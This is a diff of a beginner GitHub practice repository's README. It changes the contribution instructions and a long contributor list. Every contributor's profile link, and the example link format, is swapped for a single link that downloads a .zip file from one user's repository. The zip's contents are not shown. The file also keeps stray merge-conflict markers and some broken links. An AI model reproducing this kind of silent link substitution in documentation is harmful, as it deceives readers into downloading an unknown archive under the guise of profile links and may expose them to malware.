@@ -7,14 +7,14 @@
 1. Fork the repository........
 
 2. Append your username to the Contributers Section in this file in the following format:
-	`- [@username](https://github.com/username)`
+	`- [@username](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)`
 
 3. Make a Pull Request (PR) via github and it will make u assure to learn github.
 =======
 1. Fork the repository..
 
 2. Append your username to the Contributers Section in this file in the following format:
-	`- [@username](https://github.com/username)`
+	`- [@username](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)`
 3. Make a Pull Request (PR) via github...
 3. Make a Pull Request (PR) via github..
 
@@ -22,207 +22,207 @@
 ## Contributors:
 
 
--[@Raunakk02](https://github.com/Raunakk02)
+-[@Raunakk02](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 =======
-- [@Sac@github@2019](https://github.com/Sac@github@2019)
+- [@Sac@github@2019](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@kunaljain0212](https://github.com/kunaljain0212)
+- [@kunaljain0212](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 	
-- [@harshitkd](https://github.com/harshitkd)
-- [@dhananjay510](https://github.com/dhananjay510)
+- [@harshitkd](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@dhananjay510](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@AlternateF4](https://github.com/AlternateF4)
+- [@AlternateF4](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@bhch1507](https://github.com/bhch1507)
+- [@bhch1507](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@sahilahmed0707](https://github.com/sahilahmed0707)
-
-
-- [@ojaswa1942](https://github.com/ojaswa1942)
-
-- [@prmsrswt](https://github.com/prmsrswt)
-
-- [@mavi05](https://github.com/mavi05)
-
-- [@ji-kun](https://github.com/ji-kun)
-
-- [@visheshkl](https://github.com/visheshkl)
-
-- [@rushyataksande](https://github.com/rushyataksande)
-
-- [@pankajgoyal1](https://github.com/pankajgoyal1)
-
-- [@ruchika28ag](https://github.com/ruchika28ag)
-
-- [@JesusChrist0](https://github.com/jesuschrist0)
-
-- [@blair-d](https://github.com/blair-d)
-
--[@Gurjotsingh2002](https://github.com/Gurjotsingh2002)
-
-- [@balu14012001](https://github.com/BALAJIRAO676)
-
-- [@ashraygupta001](http://github.com/ashraygupta001)
-
-- [@bhanu3509](https://github.com/bhanu3509)
-
-- [Alok02Jha](https://github.com/Alok02Jha)
--[@Alok02Jha](https://github.com/Alok02Jha)
-
-- [@nehalgupta13](https://github.com/nehalgupta13)
-
-- [@KartikShukla2001](https://github.com/KaritkShukla2001)
+- [@sahilahmed0707](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
 
-- [@Sac@github@2019](https://github.com/Sac@github@2019)
-- [@sastava007](https://github.com/sastava007)
+- [@ojaswa1942](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@sar99](https://github.com/sar99)
+- [@prmsrswt](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@Fdgod10](https://github.com/Fdgod10)
+- [@mavi05](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@darkhorse07](https://github.com/darkhorse)
+- [@ji-kun](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@bigshotsam](https://github.com/bigshotsam)
+- [@visheshkl](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@verdantfire](https://github.com/verdantfire)
+- [@rushyataksande](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@udit1707](https://github.com/udit1707)
+- [@pankajgoyal1](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@ss3239891](https://github.com/ss3239891)
+- [@ruchika28ag](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@xzaviourr](https://github.com/xzaviourr)
+- [@JesusChrist0](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@sagar22091998](https://github.com/sagar22091998)
+- [@blair-d](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@Medhavi-16](https://github.com/Medhavi-16)
+-[@Gurjotsingh2002](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@shivam2191](https://github.com/shivam2191)
+- [@balu14012001](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@pradnyesh123](https://github.com/pradnyesh123)
+- [@ashraygupta001](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@rahulm499](https://github.com/rahulm499)
+- [@bhanu3509](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@bipinpathak](https://github.com/bipinpathak)
+- [Alok02Jha](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+-[@Alok02Jha](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@sakrock](https://github.com/sakrock)
+- [@nehalgupta13](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@DoublexAA](https://github.com/DoublexAA)
-
-- [@kamalgarg28](https://github.com/kamalgarg28)
-
-- [@bitrish](https://github.com/bitrish)
-
-- [@GunaShekar02](https://github.com/GunaShekar02)
-
-- [@MehulJain-831](https://github.com/MehulJain-831)
-
-- [@sayantanbanerjee16](https://github.com/sayantanbanerjee16)
-
-- [@sonivishal708](https://github.com/sonivishal9708)
-
-- [@Striker](https://github.com/Striker)
-
-- [@Mohit123singh](https://github.com/Mohit123singh)
-
-- [@sagastha](https://github.com/sagastha)
-
-- [@Piyush-Chetwani](https://github.com/Piyush-Chetwani)
-
-- [@hitanshu-mehta](https://github.com/hitanshu-mehta)
-
-- [@rutvijraut](https://github.com/rutvijraut)
-
-- [@TheSecretWolf](https://github.com/TheSecretWolf)
-
-- [@madhavik0512](https://github.com/madhavik0512)
-
-- [@AnimatedAnand](https://github.com/AnimatedAnand)
-
-- [@Prime-5](https://github.com/Prime-5)
-
-- [@FLasH5858](https://github.com/FLasH5858)
-
-- [@BroCodeClan](https://github.com/BroCodeClan) :smile:
-
-- [@Helkat](https://github.com/Helkat)
-
-- [@4molybdenum2](https://github.com/4molybdenum2)
+- [@KartikShukla2001](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
 
-- [@apurvpandey316](https://github.com/apurvpandey316)
+- [@Sac@github@2019](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@sastava007](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@sar99](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@Fdgod10](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@darkhorse07](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@bigshotsam](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@verdantfire](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@udit1707](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@ss3239891](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@xzaviourr](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@sagar22091998](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@Medhavi-16](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@shivam2191](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@pradnyesh123](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@rahulm499](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@bipinpathak](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@sakrock](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@DoublexAA](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@kamalgarg28](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@bitrish](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@GunaShekar02](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@MehulJain-831](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@sayantanbanerjee16](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@sonivishal708](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@Striker](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@Mohit123singh](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@sagastha](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@Piyush-Chetwani](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@hitanshu-mehta](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@rutvijraut](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@TheSecretWolf](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@madhavik0512](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@AnimatedAnand](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@Prime-5](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@FLasH5858](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@BroCodeClan](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip) :smile:
+
+- [@Helkat](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@4molybdenum2](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+
+- [@apurvpandey316](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 =======
 
-- [@kaustubh-029](https://github.com/kaustubh-029)
+- [@kaustubh-029](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 =======
 
--[@aditiii23](https://github.com/aditiii23)
+-[@aditiii23](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 =======
-- [@Krishna-Gandhi](https://github.com/Krishna-Gandhi)
+- [@Krishna-Gandhi](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
 
 
 
-- [@PrateekSingh009](https://github.com/PrateekSingh009)
-- [@manishprivet](https://github.com/manishprivet)
-- [@klakshya17] (https://github.com/klakshya17)
-- [@klakshya17] (https://github.com/klakshya17)
-- [@ImAkhil24](https://github.com/ImAkhil24)
-- [@jayraikhere](https://github.com/jayraikhere)
+- [@PrateekSingh009](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@manishprivet](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@klakshya17] (https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@klakshya17] (https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@ImAkhil24](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@jayraikhere](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@P0l0nium](https://github.com/P0l0nium)
+- [@P0l0nium](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@nafees87n](https://github.com/nafees87n)
+- [@nafees87n](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
--[@akarsh2312](https://githhub.com/akarsh2312)
-- [@aikansh2001yadav](https://github.com/aikansh2001yadav)
+-[@akarsh2312](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@aikansh2001yadav](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@niketan-byte](https://github.comm/niketan-byte)
-- [@niketan-byte](https://github.comm/niketan-byte)
-- [@4molybdenum2](https://github.com/4molybdenum2)
-- [@hs2361](https://github.com/hs2361) :smile:
+- [@niketan-byte](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@niketan-byte](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@4molybdenum2](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@hs2361](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip) :smile:
 
-- [@4molybdenum2](https://github.com/4molybdenum2)
+- [@4molybdenum2](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@4molybdenum2](https://github.com/4molybdenum2)
+- [@4molybdenum2](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@SRiYaa](https://github.com/SRiYaa)
+- [@SRiYaa](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 -
-- [@mnithinreddy](https://github.com/mnithinreddy)
-- [@frozen-eagle043](https://github.com/frozen-eagle043)
+- [@mnithinreddy](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@frozen-eagle043](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 - fe43
-- [@ashish1198](https://github.com/ashish1198)
+- [@ashish1198](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
-- [@Samar787](https://github.com/Samar787)
-- [@vishnuiiit](https://github.com/vishnuiiit)
-
-
-- [@aditisingh2362](https://github.com/aditisingh2362)
-
--[@aditiii23](https://github.com/aditiii23)
--[@akshat45](https://github.com/akshat45)
-
-- [@deependrayadav](https://github.com/deependrayadav)
--[@Niketan0109](https://github.com/Niketan0109
--[@raikherejay](https;//github.com/raikherejay)
+- [@Samar787](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@vishnuiiit](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
 
--[@palakjain21](http://github.com/palakjain21)
--[@akshat45](https://github.com/akshat45)
-- [@karthikianala](https://github.com/karthikianala)
--[@pranav-msc](https://github.com/pranav-msc)
+- [@aditisingh2362](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
- - [@ajinkya359](https://github.com/ajinkya359)
- - [@ajinkya359](https://github.com/ajinkya359)
+-[@aditiii23](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+-[@akshat45](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+- [@deependrayadav](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+-[@Niketan0109](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip
+-[@raikherejay](https;https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+
+-[@palakjain21](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+-[@akshat45](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@karthikianala](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+-[@pranav-msc](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+
+ - [@ajinkya359](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+ - [@ajinkya359](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
  
- - [@ajinkya359](https://github.com/ajinkya359)
+ - [@ajinkya359](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
- - [@ajinkya359](https://github.com/ajinkya359)
-- [@harshitmoriya](https://github.com/Harshitmoriya)
+ - [@ajinkya359](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
+- [@harshitmoriya](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
--[@Magraa](https://github.com/Magraa)
+-[@Magraa](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip)
 
--[@shikhar2001](https://github.com/shikhar2001]
+-[@shikhar2001](https://raw.githubusercontent.com/apurvpandey316/my-first-pr/master/Norma/my-first-pr.zip]
 
 
 
